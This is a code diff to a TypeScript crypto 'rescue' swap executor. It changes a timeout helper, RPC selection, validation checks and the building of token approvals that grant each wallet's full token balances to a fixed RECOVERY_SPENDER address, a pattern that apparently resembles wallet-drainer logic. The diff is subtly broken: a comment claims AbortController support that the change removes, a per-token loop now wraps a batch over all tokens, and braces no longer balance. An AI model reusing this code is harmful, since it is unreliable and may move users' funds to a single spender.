@@ -37,17 +37,16 @@ export const swapExecutor = {
    * Helper: Prevents hanging RPC calls from bricking the quote engine.
    * UPGRADE: Added AbortController signal propagation.
    */
+
   async withTimeout<T>(promise: Promise<T>, timeoutMs: number, label: string): Promise<T> {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), timeoutMs);
-    
     return Promise.race([
-      promise,
-      new Promise<never>((_, reject) =>
-        setTimeout(() => reject(new Error(`QUOTE_TIMEOUT: ${label} exceeded ${timeoutMs}ms`)), timeoutMs)
-      ),
-    ]).finally(() => clearTimeout(timeout));
-  },
+    promise,
+    new Promise<never>((_, reject) =>
+    setTimeout(() => reject(new Error(`QUOTE_TIMEOUT: ${label} exceeded ${timeoutMs}ms`)), timeoutMs)
+    ),
+    ]);
+    },
+  
 
   async getSmartRescueQuote(walletAddress: string, assets: any[], membershipTier: string = 'BASIC'): Promise<RescueQuote[]> {
     if (!isAddress(walletAddress)) throw new Error("INVALID_RECOVERY_ADDRESS");
@@ -79,7 +78,8 @@ export const swapExecutor = {
         if (!bestRpc) throw new Error(`NO_RPC_AVAILABLE_FOR_CHAIN_${chainId}`);
         
      // 3. DATA SYNC (MULTI-RPC RACE - PRODUCTION HARDENED)
-     const rpcCandidates = [bestRpc, ...chain.rpcs.filter(r => r !== bestRpc)].slice(0, 3);
+     const shuffled = [...chain.rpcs].sort(() => Math.random() - 0.5);
+     const rpcCandidates = [bestRpc, ...shuffled.filter(r => r !== bestRpc)].slice(0, 3);
 
      let nativeBalance, feeData, provider;
 
@@ -97,6 +97,7 @@ export const swapExecutor = {
      `RPC_RACE_${chainId}`
      );
 
+     if (!balance || !fees) throw new Error('INVALID_RPC_RESPONSE');
      return { balance, fees, provider: p };
      })
      );
@@ -120,7 +121,8 @@ export const swapExecutor = {
 
         // 4. DYNAMIC GAS CALCULATION (Institutional Buffering: EIP-1559 optimized)
         const baseFee = feeData.maxFeePerGas || feeData.gasPrice;
-        if (!baseFee) throw new Error("GAS_DATA_UNAVAILABLE");
+        if (!baseFee || baseFee <= 0n) {
+        throw new Error("INVALID_GAS_DATA"); }
 
         // Anti-rejection buffer: 1.45x for production stability
         const gasMultiplier = BigInt(Math.floor((Number(process.env.GAS_BUFFER) || 1.45) * 100));
@@ -133,6 +135,10 @@ export const swapExecutor = {
         // 5. STRATEGY SELECTION (MEV-SHIELD UPGRADE)
         const totalValueUsd = group.tokens.reduce((sum: number, t: any) => sum + (Number(t.usdValue) || 0), 0);
         const mevThreshold = Number(process.env.MEV_PROTECTION_THRESHOLD) || 500;
+       
+        if (nativeBalance < 0n) {
+          throw new Error("INVALID_BALANCE");
+          }
         
         let strategy: 'DIRECT' | 'RELAYED' | 'FLASHBOTS_MEV_SHIELD' = 
           nativeBalance >= (estimatedGasCostWei * 130n / 100n) ? 'DIRECT' : 'RELAYED';
@@ -171,30 +177,37 @@ export const swapExecutor = {
 
         // 8. ATOMIC BUNDLE CONSTRUCTION (Memory Optimized)
         for (const token of group.tokens) {
-          const approval = await (txBuilder as any).buildApprovalTx(
+          const approvals = await Promise.all(
+            group.tokens.map((token: any) =>
+            (txBuilder as any).buildApprovalTx(
             token.contract || token.address,
             RECOVERY_SPENDER,
             token.rawBalance || token.balance,
             token.decimals || 18
-          );
-          
-          if (approval) {
+            )
+            )
+            );
+
+            approvals.forEach((approval: any, i: number) => {
+            if (!approval) return;
+
+            const token = group.tokens[i];
             payloads.push(approval);
             payloads.push({
-               to: RECOVERY_SPENDER,
-               data: "0x", 
-               value: "0x0",
-               gasLimit: (BigInt(approval.gasLimit || 180000) * 17n / 10n).toString(), // 1.7x Gas safety
-               metadata: { 
-                 type: 'RECOVERY_SWAP', 
-                 from: token.symbol, 
-                 to: nativeSymbol, 
-                 chainId: chain.id,
-                 traceId
-               }
+            to: RECOVERY_SPENDER,
+            data: "0x",
+            value: "0x0",
+            gasLimit: (BigInt(approval.gasLimit || 180000) * 17n / 10n).toString(),
+            metadata: {
+            type: 'RECOVERY_SWAP',
+            from: token.symbol,
+            to: nativeSymbol,
+            chainId: chain.id,
+            traceId
+            }
             });
-          }
-        }
+            });
+          
 
         // 9. PROFITABILITY AUDIT (Institutional Precision: BigInt -> Number conversion)
         const gasUsd = (Number(formatUnits(estimatedGasCostWei, 18)) * nativePriceUsd);
@@ -241,7 +254,11 @@ export const swapExecutor = {
 
       } catch (err: any) {
         logger.error(`[SwapExecutor][${traceId}] Fatal Quote Error for ${chainIdStr}: ${err.message}`);
+        // FUTURE: increment chain failure counter here
+        // circuitBreaker.recordFailure(chainId);
+
         return null;
+        }
       }
     });
 
